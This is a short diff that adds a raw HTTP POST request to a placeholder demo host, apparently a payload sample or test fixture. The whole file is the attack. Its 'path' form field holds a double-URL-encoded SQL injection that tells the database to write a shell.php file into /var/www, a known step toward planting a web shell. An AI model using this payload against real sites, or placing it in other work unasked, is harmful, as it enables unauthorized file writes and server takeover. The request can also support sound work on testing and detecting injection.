@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Connection: close
+
+path=1%2527%2Binto%2Boutfile%2B%2527%252Fvar%252Fwww%252Fshell.php%2527--%2B-
